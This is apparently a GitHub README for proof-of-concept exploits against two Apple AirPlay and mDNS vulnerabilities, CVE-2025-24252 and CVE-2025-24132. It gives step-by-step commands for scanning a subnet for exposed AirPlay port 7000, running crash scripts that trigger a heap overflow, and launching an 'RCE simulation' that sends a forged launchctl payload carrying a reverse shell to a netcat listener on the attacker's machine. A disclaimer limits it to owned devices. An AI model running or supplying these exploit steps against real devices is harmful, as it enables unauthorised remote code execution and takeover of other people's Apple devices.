# AIRBORNE – 2-PoCs-1-Repository

PoCs for **CVE-2025-24252** and **CVE-2025-24132**  

Discovered and detailed by Oligo Security

https://www.oligo.security/blog/airborne

Both bugs live in Apple’s parsing of network data—specifically in Bonjour/mDNS and AirPlay’s TCP pairing flow.

---

## CVE-2025-24252 – mDNS TXT Record Crash Trigger

This vulnerability affects `AirPlayReceiver` and is triggered via malformed mDNS TXT records.

### Setup on Kali Linux

```bash
sudo apt update
sudo apt install python3-scapy avahi-daemon -y
sudo systemctl start avahi-daemon
```

### Clone the Repo

```bash
git clone https://github.com/ekomsSavior/AirBorne-PoC.git
cd AirBorne-PoC
```

### Configure the PoC

```bash
nano crashtest_CVE-2025-24252.py
```

Set your attacker IP and interface. Then save and exit (`CTRL+X`, then `Y`, then `ENTER`).

### Run the PoC

```bash
python3 crashtest_CVE-2025-24252.py
```

### Monitor Target Behavior

Use `tcpdump` or Wireshark to capture traffic on the Apple device’s IP.

> Only test this on your own Apple devices in a safe lab setting.

---

## CVE-2025-24132 – AirPlay Pairing Heap Overflow

This bug is in the `AirPlayScreen` component and can trigger a heap overflow by sending malformed pairing/init packets over TCP port 7000.

---

### Scan for Vulnerable AirPlay Hosts

```bash
nmap -p 7000 --open --script=banner <your-local-subnet>/24
```

---

### Crash PoC: TCP Malformed Packet

A low-level socket-based fuzzing PoC that can be expanded into an RCE trigger.

Edit the script

```bash
nano PoC_CVE-2025-24132.py
```

Set your target IP. Then run

```bash
python3 PoC_CVE-2025-24132.py
```

Watch for
- System reboots
- Pairing process freezes
- AirPlay UI or app crashes

If observed, a heap overflow condition is likely confirmed.

---

## From Crash to Code Execution – CVE-2025-24132 RCE Simulation

### Overview

Trigger CVE-2025-24132 to simulate executing a reverse shell or `launchctl` job on a vulnerable or jailbroken Apple device.

Steps
- Overflow heap cleanly
- Inject shell command or plist-based job
- Trigger reverse shell or persistent execution

### What We Know

- AirPlay runs on TCP port `7000`
- `pairing-init` POST requests are vulnerable when oversized
- The protocol may accept binary plist payloads or plain XML

---

### Run the RCE Simulation Script

```bash
nano CVE-2025-24132_RCE.py
```

Set your
- `target_ip` (your Apple device)
- `attacker_ip` (your Kali machine)

Start your listener

```bash
nc -lvnp 4444
```

Then launch the PoC

```bash
python3 CVE-2025-24132_RCE.py
```

This sends a forged `launchctl` payload with a reverse shell string. Works only if the device is jailbroken or unpatched.

---

## DISCLAIMER

This project is for **educational and research purposes only**.

USER ASSUMES FULL RESPONSIBILITY WHEN UTILIZING THIS TOOL.  
**Only test on networks and devices you own or have explicit permission to test on.**

Unauthorized use may violate laws or terms of service.  
Use responsibly and ethically.
